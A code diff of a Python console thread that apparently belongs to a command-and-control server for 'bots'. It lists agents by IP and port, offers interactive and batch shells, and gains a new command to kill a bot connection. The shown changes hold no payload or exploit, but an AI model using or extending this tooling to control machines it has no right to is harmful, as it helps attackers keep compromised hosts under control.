@@ -14,13 +14,14 @@ import time
 # from server import batchList, aliveConnections, deadConnections, clientAddressList
 
 class Interpreter(threading.Thread):
-    def __init__(self, agentList):
+    def __init__(self, agentList, listeners, responseQueue):
         threading.Thread.__init__(self)     # Spawn a new thread for itself
         self.agentList = agentList
+        self.listeners = listeners
 
     def run(self):
-
-        cmd_history = []
+        # Start of a command history implementation, put on hold by fuuuuucking queueueueueues
+        # cmd_history = []
 
         while True:
 
@@ -45,12 +46,27 @@ class Interpreter(threading.Thread):
                 self.exit()
             elif (cmd == "clear"):
                 self.clearScreen()
+            
             elif (cmd == "list-agents"):
                 self.listAgents()
             # elif (cmd == "list-dead"):
             #     self.listDead()
             elif (cmd == "batch-mode"):
                 self.batchMode()
+            elif (cmd.startswith("kill")):
+                try:
+                    print(cmd)
+                    arg_id = int(cmd.split()[1])
+                    print(arg_id)
+                except Exception as ex:
+                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
+                    print(f"[* Interpreter-Msg] Error: {ex}")
+                else:
+                    try:
+                        self.kill(arg_id)
+                    except Exception as ex: 
+                        print(f"[* Interpreter-Msg] Unable to kill connection with bot {arg_id}...")
+                        print(f"[* Interpreter-Msg] Error: {ex}")
             elif (cmd.startswith("interact")):
                 try:
                     print(cmd)
@@ -192,8 +208,8 @@ class Interpreter(threading.Thread):
         os._exit(0)
 #------------------------------------------------------------------------------------------------------------------------------
     def listAgents(self): # Change to listAlive(self)
-        print("       .------------------.        ")
-        print("       |  LIST OF AGENTS  |        ")
+        print("       .------------------.                                    ")
+        print("       |  LIST OF AGENTS  |                                    ")
         print(".------:------------------:-------.-------------.-------------.")
         print(":  ID  :  IP ADDRESS (v4) :  PORT : HOST-STATUS : CONN-STATUS :")
         print(":------:------------------:-------:-------------:-------------:")
@@ -240,3 +256,18 @@ class Interpreter(threading.Thread):
         else:
             print("[* Interpreter-Msg] Shell exited with errors...\n")
 
+    def kill(self, id):
+        print(f"[* Interpreter-Msg] Killing connection with Bot #{id}.\n")
+
+        for agent in self.agentList:
+            if agent.getID() == id:
+                killStatus = agent.kill()
+
+        if killStatus:
+            print(f"[* Interpreter-Msg] Bot #{id} was killed peacefully...\n")
+            for agent in self.agentList:
+                if agent.getID() == id:
+                    self.agentList.remove(agent)
+                    break
+        else:
+            print(f"[* Interpreter-Msg] Bot #{id} was killed with errors...\n")
